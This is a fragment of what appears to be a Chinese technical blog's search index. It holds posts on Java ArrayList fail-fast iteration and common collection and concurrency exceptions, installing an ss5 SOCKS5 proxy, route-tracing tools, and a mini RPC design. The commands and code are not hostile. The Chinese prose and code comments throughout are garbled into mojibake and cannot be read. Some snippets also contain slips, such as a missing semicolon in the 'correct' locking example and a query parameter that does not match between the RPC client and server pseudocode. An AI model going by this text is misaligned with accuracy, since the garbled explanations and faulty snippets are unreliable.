class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Itr</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* An optimized version of AbstractList.Itr</span></span><br><span class="line"><span class="comment">* å†…éƒ¨ç±»ï¼Œå¯ä»¥ç›´æ¥è®¿é—®å®¿ä¸»ç±»å±æ€§ã€‚ç”¨äºå®¹å™¨è¿­ä»£ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Itr</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="type">int</span> cursor;       <span class="comment">// index of next element to return</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">lastRet</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></span><br><span class="line">    <span class="comment">// ä¿ç•™åŸå§‹çš„modCountå€¼ï¼Œå¯ä»¥çœ‹åšæ˜¯oldModCount</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor != size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æ¯æ¬¡è¿­ä»£æ˜¯éƒ½æ£€æŸ¥ </span></span><br><span class="line">        checkForComodification();</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        cursor = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">        checkForComodification();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ArrayList.<span class="built_in">this</span>.remove(lastRet);</span><br><span class="line">            cursor = lastRet;</span><br><span class="line">            lastRet = -<span class="number">1</span>;</span><br><span class="line">            <span class="comment">// ç›´æ¥è°ƒç”¨it.remove()åä¸ä¼šè§¦å‘ConcurrentModificationExceptionå¼‚å¸¸</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œä¼šé‡ç½®expectedModCountçš„å€¼</span></span><br><span class="line">            expectedModCount = modCount;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; consumer)</span> &#123;</span><br><span class="line">        Objects.requireNonNull(consumer);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> ArrayList.<span class="built_in">this</span>.size;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</span><br><span class="line">            consumer.accept((E) elementData[i++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// update once at end of iteration to reduce heap write traffic</span></span><br><span class="line">        cursor = i;</span><br><span class="line">        lastRet = i - <span class="number">1</span>;</span><br><span class="line">        checkForComodification();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// modCount ä¸ºå®¿ä¸»ç±»å±æ€§ï¼Œå®æ—¶çš„</span></span><br><span class="line">        <span class="comment">// expectedModCount ä¸ºåˆ›å»ºè¿­ä»£å™¨æ—¶çš„ modCount</span></span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœè¿™é‡Œæ²¡æœ‰å³æ—¶æŠ›å‡º`ConcurrentModificationException`å¼‚å¸¸ï¼Œ</span></span><br><span class="line"><span class="comment">// å› ä¸ºæˆ‘ä»¬åœ¨å¾ªç¯å¼€å§‹å‰å·²ç»å–è¿‡sizeå€¼ï¼Œé‚£ä¹ˆåé¢è‚¯å®šä¼šå› ä¸ºåˆ é™¤å…ƒç´ æŠ›å‡º`ArrayIndexOutOfBoundsException`å¼‚å¸¸ã€‚</span></span><br><span class="line"><span class="comment">// è¿™ç§æœºåˆ¶è¢«ç§°ä¸ºåŠæ—¶å¤±è´¥ï¼ˆfail-fastï¼‰ï¼ŒåŠæ—©å‘ç°é—®é¢˜æŠ›å‡ºé—®é¢˜é¿å…æ— æ„ä¹‰çš„æ“ä½œï¼Œå› ä¸ºæœ€ç»ˆè¿­ä»£è¿‡ç¨‹å¯èƒ½å‡ºç°å¼‚å¸¸ã€‚</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.size(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;pill&quot;</span>.equals(strs.get(i))) strs.remove(strs.get(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  è§£å†³æ–¹æ³•ä½¿ç”¨<code>CopyOnWriteArrayList</code>æ›¿ä»£<code>ArrayList</code>ã€‚</p></li><li><p>java.lang.UnsupportedOperationException</p><p>  å®¹å™¨é€¸å‡ºæ—¶ï¼Œä¸ºäº†é¿å…å®¹å™¨è¢«ä¿®æ”¹å¯ä»¥ä½¿ç”¨<code>Collections.unmodifiable(Map|List)</code>ç­‰é™æ€æ–¹æ³•åŒ…è£…å®¹å™¨æ¥ä¿æŠ¤åŸå§‹å®¹å™¨ä¸è¢«ä¿®æ”¹ã€‚</p><p>  è°ƒç”¨è¿™äº›å®¹å™¨çš„ä¿®æ”¹æ“ä½œ(add&#x2F;remove)æ—¶ä¼šæŠ›å‡ºUnsupportedOperationExceptionå¼‚å¸¸ã€‚</p><p>  å¦å¤–ï¼š<code>Arrays.asList</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª<code>fixed-size</code>listï¼Œæˆ‘ä»¬è°ƒç”¨å®ƒçš„ä¿®æ”¹æˆæ“ä½œæ—¶ä¹Ÿä¼šæŠ›å‡º<code>UnsupportedOperationException</code>å¼‚å¸¸ã€‚å¯¹å…¶é‡æ–°å°è£…<code>new ArrayList&lt;&gt;(Arrays.asList(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;))</code>åå°±ä¸ä¼šå‡ºç°æ­¤é—®é¢˜ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; strs = Collections.unmodifiableList(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>)));</span><br><span class="line">strs.remove(<span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>java.lang.IllegalMonitorStateException</p><p>  è¿™åœ¨æˆ‘ä»¬è°ƒç”¨å¯¹è±¡çš„<code>wait</code>æˆ–è€…<code>notify/notifyAll</code>æ—¶ä¼šæŠ›å‡ºï¼Œä¸»è¦åŸå› æ˜¯æˆ‘ä»¬æ²¡æœ‰è·å–è¢«è¢«è°ƒç”¨å¯¹è±¡çš„é”ã€‚</p><p>  é”™è¯¯ç¤ºä¾‹ï¼š</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">lock.wait(); </span><br><span class="line">doSomething();</span><br><span class="line">lock.notifyAll();</span><br></pre></td></tr></table></figure><p>  æ­£ç¡®ç¤ºä¾‹ï¼š</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    lock.wait();</span><br><span class="line">    doSomething()</span><br><span class="line">    lock.notifyAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://book.douban.com/subject/10484692/">Javaå¹¶å‘ç¼–ç¨‹å®æˆ˜</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sock5</title>
      <link href="/post/sock5.html"/>
      <url>/post/sock5.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sock5"><a href="#Sock5" class="headerlink" title="Sock5"></a>Sock5</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><ol><li><p>ç¯å¢ƒå‡†å¤‡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc automake autoconf libtool make</span><br><span class="line">yum -y install pam-devel openldap-devel cyrus-sasl-devel</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘å®‰è£…</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://sourceforge.net/projects/ss5/files/&gt;</span><br><span class="line">tar zxvf ss5-3.8.9-8.tar.gz</span><br><span class="line">cd ss5-3.8.9</span><br><span class="line">./configure  //notes:(é»˜è®¤æ˜¯1080ç«¯å£ï¼Œå¦‚æœæƒ³æ”¹ç«¯å£çš„è¯ï¼Œ./configure â€“with-defaultport=5533</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/init.d/ss5</span><br><span class="line">/etc/init.d/ss5 start </span><br></pre></td></tr></table></figure></li></ol><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><ol><li><p>å®‰è£…æœåŠ¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add ss5</span><br><span class="line">chkconfig ss5 on</span><br></pre></td></tr></table></figure></li><li><p>æƒé™é…ç½®</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/opt/ss5/ss5.conf </span><br><span class="line"># ä¿®æ”¹ SHost SPort Authentication </span><br><span class="line">auth 0.0.0.0/0 â€“ -</span><br><span class="line">æ”¹ä¸º</span><br><span class="line">auth 0.0.0.0/0 â€“ u</span><br><span class="line">permit â€“ 0.0.0.0/0 â€“ 0.0.0.0/0 â€“ â€“ â€“ â€“ -</span><br><span class="line">æ”¹æˆä¸º</span><br><span class="line">permit u 0.0.0.0/0 â€“ 0.0.0.0/0 â€“ â€“ â€“ â€“ -</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·</span><br><span class="line">touch /etc/opt/ss5/ss5.passwd</span><br><span class="line">echo &quot;username password&quot; &gt; /etc/opt/ss5/ss5.passwd</span><br><span class="line"></span><br><span class="line"># é‡å¯</span><br><span class="line">service ss5 restart</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.ttlsa.com/linux/linux-setup-socks-5-ttlsa/">linuxä¸‹æ­å»ºsocks 5ä»£ç†</a></li><li><a href="http://awy.me/2014/06/yong-shadowsocks-he-proxifier-zi-you-fang-wen-hu-lian-wang/">ç”¨Proxifierè‡ªç”±è®¿é—®äº’è”ç½‘</a></li><li><a href="http://blackwolfsec.cc/2016/09/19/Proxifier_Shadowshocks/">Proxifierç³»ç»Ÿå…¨å±€ä»£ç†çš„æ­£ç¡®å§¿åŠ¿</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> sock5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·¯ç”±è¯Šæ–­</title>
      <link href="/post/traceroute.html"/>
      <url>/post/traceroute.html</url>
      
        <content type="html"><![CDATA[<h3 id="è·¯ç”±è¯Šæ–­"><a href="#è·¯ç”±è¯Šæ–­" class="headerlink" title="è·¯ç”±è¯Šæ–­"></a>è·¯ç”±è¯Šæ–­</h3><ol><li><p><a href="https://www.ipip.net/download.html#ip_trace">BestTrace</a><br> <img src="/images/1512385451690.jpg"></p></li><li><p><a href="https://github.com/traviscross/mtr">mtr</a><br> <img src="/images/QQ20171204-191523@2x.jpg"></p></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://blog.51cto.com/xuanwei/1959268">ç½‘ç»œè¿é€šæ€§åˆ¤æ–­å·¥å…·mtrå‘½ä»¤</a></li><li><a href="https://moonagic.com/install-mtr-on-mac/">Macå®‰è£…mtr</a></li><li><a href="https://segmentfault.com/a/1190000000425751">å¦‚ä½•ç”¨Linuxå‘½ä»¤è¡Œç®¡ç†ç½‘ç»œ</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è¿·ä½ RPC</title>
      <link href="/post/mini-rpc.html"/>
      <url>/post/mini-rpc.html</url>
      
        <content type="html"><![CDATA[<h2 id="mini-dubbo"><a href="#mini-dubbo" class="headerlink" title="mini-dubbo"></a>mini-dubbo</h2><p>dubboã€thriftã€grpc <a href="http://colobu.com/2016/09/05/benchmarks-of-popular-rpc-frameworks/">http://colobu.com/2016/09/05/benchmarks-of-popular-rpc-frameworks/</a></p><h3 id="ä¸»è¦è®¾è®¡æ¶æ„"><a href="#ä¸»è¦è®¾è®¡æ¶æ„" class="headerlink" title="ä¸»è¦è®¾è®¡æ¶æ„"></a>ä¸»è¦è®¾è®¡æ¶æ„</h3><ol><li><p>æœåŠ¡ç®¡ç†ä¸­å¿ƒ</p><ol><li>æœåŠ¡æ³¨å†Œ<br> zookeeper&#x2F;etcd</li></ol></li><li><p>RPCæœåŠ¡</p><ol><li>åºåˆ—åŒ–åè®®<br> json&#x2F;<a href="http://wiki.geekdream.com/Specification/json-rpc_2.0.html">JSON-RPC</a>&#x2F;thrift&#x2F;protobuf</li><li>ä¼ è¾“å±‚<br> http netty&#x2F;sun-httpServer&#x2F;vert.x(é˜²æ­¢ä¸»å¾ªç¯é˜»å¡)</li></ol></li></ol><h3 id="jsonå’Œthrift-protobufæ¯”è¾ƒ"><a href="#jsonå’Œthrift-protobufæ¯”è¾ƒ" class="headerlink" title="jsonå’Œthrift&#x2F;protobufæ¯”è¾ƒ"></a>jsonå’Œthrift&#x2F;protobufæ¯”è¾ƒ</h3><ol><li><code>thrift/protobuf</code> ç­‰åè®®åºåˆ—åŒ–åå­—èŠ‚æ›´å°ã€åºåˆ—åŒ–é€Ÿåº¦æ›´å¿«ã€‚<code>json</code>å­˜åœ¨å†—ä½™ï¼Œåºåˆ—åŒ–æ•ˆç‡ä¹Ÿæ²¡æœ‰å‰ä¸¤è€…é«˜ã€‚</li><li><code>thrift/protobuf</code> éœ€è¦å®šä¹‰schemaï¼Œé‡æ–°ç”Ÿæˆå®ä½“ç±»ï¼ˆVOï¼‰ã€‚<code>json</code>å¯ä»¥ç›´æ¥ä½¿ç”¨ç°æœ‰å®ä½“ç±»ï¼Œæˆ‘ä»¬åªéœ€è¦å°†<code>å®ä½“</code>å’Œ<code>Interface</code>å¯¹å¤–å‘å¸ƒå³å¯ã€‚</li><li><code>thrift/protobuf</code> åºåˆ—åŒ–åæ— æ³•é˜…è¯»ï¼Œå¯¹äººç±»ä¸å‹å¥½ã€‚</li><li><code>thrift/protobuf</code> èƒ½éå¸¸æ–¹ä¾¿çš„å®ç°è·¨è¯­è¨€åºåˆ—åŒ–ååºåˆ—åŒ–ï¼Œ<code>json</code>åœ¨è·¨è¯­è¨€æ—¶è¾ƒéº»çƒ¦ã€‚</li></ol><h3 id="æ³¨å†ŒæœåŠ¡åè®®"><a href="#æ³¨å†ŒæœåŠ¡åè®®" class="headerlink" title="æ³¨å†ŒæœåŠ¡åè®®"></a>æ³¨å†ŒæœåŠ¡åè®®</h3><p>ç±»ä¼¼dubboï¼ŒæœåŠ¡å™¨å¯åŠ¨ã€åœæ­¢æ—¶å»æ³¨å†Œã€æ³¨é”€æœåŠ¡å³å¯ã€‚ä¸ºäº†é˜²æ­¢å‡ºç°<code>kill -9</code>ç­‰æƒ…å†µä¸‹æœåŠ¡ä¸èƒ½æ³¨é”€ï¼Œå¯ä»¥æ·»åŠ å¿ƒè·³æ£€æŸ¥æˆ–è€…æ— å“åº”è‡ªåŠ¨å‰”é™¤ç­‰åŠŸèƒ½ã€‚<br><img src="/images/zk-dubbo2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.3:20880/cc.kekek.dubbo.demo.DemoService?anyhost=true&amp;application=demo-provider&amp;dubbo=2.5.7&amp;generic=false&amp;interface=com.example.demo.DemoService&amp;methods=sayHello,sayName&amp;pid=54299&amp;side=provider&amp;timestamp=1511263842858</span><br></pre></td></tr></table></figure><h3 id="RPC-HTTP-åè®®"><a href="#RPC-HTTP-åè®®" class="headerlink" title="RPC(HTTP)åè®®"></a>RPC(HTTP)åè®®</h3><p>è¯·æ±‚ä½“ç±»ä¼¼ <code>multipart/form-data</code>ï¼Œåœ¨åŸæœ‰åè®®ä¸Šæ·»åŠ äº†typeå­—æ®µï¼Œç”¨æ¥å®šä¹‰æ­¤å‚æ•°çš„å®é™…ç±»å‹ã€‚åŸæœ‰<code>Content-Type</code>ä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰åºåˆ—åŒ–æ ¼å¼<code>application/json</code>ã€<code>application/x-protobuf</code>ã€<code>application/x-thrift</code>ç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com/invoke?interface=com.example.rpc.service.UserService&amp;method=hello&amp;parameters=java.lang.Integer,java.lang.String,com.example.rpc.model.User HTTP/1.1</span><br><span class="line">Content-Type:multipart/form-data; boundary=----RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;args[0]&quot;; type=&quot;java.lang.Integer&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;args[1]&quot;; type=&quot;java.lang.String&quot;</span><br><span class="line"></span><br><span class="line">å°æ˜</span><br><span class="line">------RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;args[2]&quot;; type=&quot;com.example.rpc.model.User&quot;</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:123,&quot;name&quot;:&quot;å°æ˜&quot;,&quot;age&quot;:18&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GET &#x2F;heartbeat å¿ƒè·³æ¥å£</p></blockquote><h3 id="å®¢æˆ·ç«¯ä¼ªä»£ç "><a href="#å®¢æˆ·ç«¯ä¼ªä»£ç " class="headerlink" title="å®¢æˆ·ç«¯ä¼ªä»£ç "></a>å®¢æˆ·ç«¯ä¼ªä»£ç </h3><p>é€šè¿‡åŠ¨æ€ä»£ç†ç”Ÿæˆæ¥å£çš„å®ç°ç±»ï¼Œé€šè¿‡åŠ¨æ€ä»£ç†åœ¨<code>invoke</code>æ–¹æ³•é‡Œé¢å‘é€ç½‘ç»œè¯·æ±‚åˆ°RPCServerã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;service&#125;, (proxy, method, objects) -&gt; &#123;</span><br><span class="line">        Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">        Parameter[] parameters = method.getParameters();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> httpClient.post(<span class="string">&quot;http://localhost:1125/invoke&quot;</span>)</span><br><span class="line">            .addQuery(<span class="string">&quot;interface&quot;</span>, <span class="string">&quot;com.example.rpc.service.UserService&quot;</span>) <span class="comment">// serviceName</span></span><br><span class="line">            .addQuery(<span class="string">&quot;method&quot;</span>, method.getName())</span><br><span class="line">            .addQuery(<span class="string">&quot;parameters&quot;</span>, <span class="string">&quot;java.lang.Integer&quot;</span>) <span class="comment">// parameters type</span></span><br><span class="line">            .addBody(<span class="string">&#x27;123\r\n&#x27;</span>); <span class="comment">// objects</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JSON.parseObject(user, returnType);</span><br><span class="line">    &#125;); </span><br></pre></td></tr></table></figure><h3 id="æœåŠ¡å™¨ç«¯ä¼ªä»£ç "><a href="#æœåŠ¡å™¨ç«¯ä¼ªä»£ç " class="headerlink" title="æœåŠ¡å™¨ç«¯ä¼ªä»£ç "></a>æœåŠ¡å™¨ç«¯ä¼ªä»£ç </h3><p>é¦–å…ˆæ ¹æ®<code>serviceName</code>è·å–å…·ä½“å®ç°ç±»ï¼Œç„¶åè·å–å…·ä½“çš„æ–¹æ³•ã€‚æœ€åé€šè¿‡åå°„è°ƒç”¨è°ƒç”¨å®ç°ç±»çš„æ–¹æ³•å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(HttpRequest req, HttpResponse res)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">service</span> <span class="operator">=</span> req.getQuery(<span class="string">&#x27;service&#x27;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> req.getQuery(<span class="string">&#x27;method&#x27;</span>);</span><br><span class="line">    String[] parameters = req.getQuery(<span class="string">&#x27;parameters&#x27;</span>);</span><br><span class="line">    String[] body = req.getBody();</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> services.getBean(service);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getMethod(methodName, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;...&#125;); <span class="comment">// parameters to Class </span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span>  method.invoke(bean, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;...&#125;); <span class="comment">// body to Object</span></span><br><span class="line"></span><br><span class="line">    res.json(returnValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux ç”¨æˆ·å’Œç”¨æˆ·ç»„</title>
      <link href="/post/linux-user-group.html"/>
      <url>/post/linux-user-group.html</url>
      
